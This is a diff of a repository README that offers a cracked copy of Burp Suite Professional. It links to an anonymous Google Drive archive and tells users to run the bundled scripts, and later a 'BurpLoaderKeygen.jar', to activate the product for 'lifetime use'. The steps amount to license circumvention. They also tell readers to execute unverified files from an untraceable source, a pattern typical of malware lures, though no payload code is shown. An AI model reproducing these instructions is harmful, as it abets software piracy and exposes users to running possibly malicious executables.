@@ -1,56 +1,46 @@
 # Burp Suite Professional
 
-Welcome to the Burp Suite Professional repository. This repository provides the professional version of Burp Suite for free. Follow the instructions below to download and execute the files.
+Welcome to the Burp Suite Professional repository. This repository provides the professional version of Burp Suite for free. Follow the steps below to download and activate the software.
 
 ## Prerequisites
 
-- Ensure you have the latest Java SDK installed on your system. You can download it from [Oracle's official website](https://www.oracle.com/java/technologies/javase-downloads.html) or use your package manager.
+- Ensure you have the latest Java SDK installed. You can download it from [Oracle's official website](https://www.oracle.com/java/technologies/javase-downloads.html) or use your system's package manager.
 
 ## Download
 
-1. Click on the following link to access the Google Drive folder:
-   [Download Burp Suite Professional](https://drive.google.com/drive/folders/1WNN7vJIKdUmzUHFv_2xBSdg9aPfSdYnc?usp=drive_link)
+1. Access the file via this link:  
+   [Download Burp Suite Professional](https://drive.google.com/file/d/1TmF6c742JkZsPu2ruoe4It0Jop04mdNt/view?usp=drive_link).
 
-2. Download the file `Burp Suite Professional - 2024.zip` from the folder to your local machine.
+2. Download the file `BurpSuite-Pro.zip` to your device.
 
-## Installation and Execution
+## Installation and Activation
 
 1. **Extract the ZIP File**:
-   - Use your preferred file extraction tool to extract `Burp Suite Professional - 2024.zip`.
-   - On Linux or macOS, you can use the terminal:
+   - Use your preferred tool to extract `BurpSuite-Pro.zip`.
+   - On Linux or macOS, use this terminal command:
      ```sh
-     unzip "Burp Suite Professional - 2024.zip"
+     unzip "BurpSuite-Pro.zip"
      ```
-   - On Windows, you can right-click the ZIP file and select "Extract All..."
+   - On Windows, right-click the ZIP file and choose "Extract All..."
 
-2. **Navigate to the Extracted Directory**:
-   - Open a terminal or command prompt and change to the directory where you extracted the files:
+2. **Navigate to the Extracted Folder**:
+   - Open a terminal or command prompt and move to the directory where the files were extracted:
      ```sh
-     cd "Burp Suite Professional - 2024"
+     cd "BurpSuite-Pro"
      ```
 
-3. **Execute the Files**:
-   - Execute the files in the order specified below:
+3. **Run the Activation Commands**:
+   - Run the following commands in sequence:
+     ```sh
+     java -jar burpsuite_pro_v2024.7.5.jar
+     java -jar BurpLoaderKeygen.jar
+     ```
 
-     1. **File 1**: `setup.sh`
-        ```sh
-        ./setup.sh
-        ```
+4. **Activate Burp Suite**:
+   - Copy the activation key from the key loader.
+   - Launch Burp Suite, enter the activation key, and select "Manual Activation."
+   - Re-enter the activation key and copy the request snippet.
+   - Paste the request snippet into the key loader and copy the response.
+   - Enter the response in Burp Suite and click "Activate."
 
-     2. **File 2**: `install.sh`
-        ```sh
-        ./install.sh
-        ```
-
-     3. **File 3**: `run.sh`
-        ```sh
-        ./run.sh
-        ```
-
-   (Repeat the above steps for all necessary files provided in the directory.)
-
-## Notes
-
-- Ensure you have the necessary permissions to execute the files. You might need to use `chmod` to make the files executable:
-  ```sh
-  chmod +x setup.sh install.sh run.sh
+**Congratulations!** Burp Suite Pro is now activated for lifetime use.
